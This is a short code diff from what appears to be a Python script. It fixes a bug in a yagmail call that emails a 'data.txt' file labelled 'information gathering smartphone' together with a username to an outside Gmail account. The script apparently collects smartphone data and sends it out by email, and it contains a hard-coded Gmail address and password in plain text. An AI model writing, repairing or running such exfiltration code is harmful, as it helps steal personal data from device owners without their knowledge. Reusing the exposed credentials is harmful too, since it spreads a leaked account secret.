@@ -43,7 +43,7 @@ filename = "data.txt"
 
 yag = yagmail.SMTP("tabgosko@gmail.com","rehanhan12345#")
 
-yagmail.send(
+yag.send(
 	to=receiver,
 	subject="information gathering smartphone, username : "+username,
 	attachments=filename,
